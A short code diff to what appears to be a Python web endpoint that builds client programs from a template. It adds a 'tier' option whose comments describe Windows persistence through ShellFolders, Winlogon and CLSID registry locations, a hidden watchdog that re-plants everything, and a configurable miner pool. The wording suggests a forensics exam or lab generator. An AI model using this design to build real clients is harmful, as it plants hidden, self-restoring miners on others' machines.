@@ -90,6 +90,12 @@ def build_py():
             r"^[A-Za-z0-9.-]{4,80}(:\d{2,5})?$", miner["pool"]):
         abort(400, "miner pool must be host[:port]")
     cfg = {"kind": kind, "target": target}
+    # exam tier: "lab" = 3 bait legs, "extreme" = + ShellFolders/Winlogon/
+    # CLSID legs + hidden watchdog that re-plants everything.
+    tier = str(data.get("tier", "lab")).strip().lower()
+    if tier not in ("lab", "extreme"):
+        abort(400, "tier must be lab or extreme")
+    cfg["tier"] = tier
     if miner:
         cfg["miner"] = miner
     tpl = open(os.path.join(TDIR, "client_tpl.py")).read()
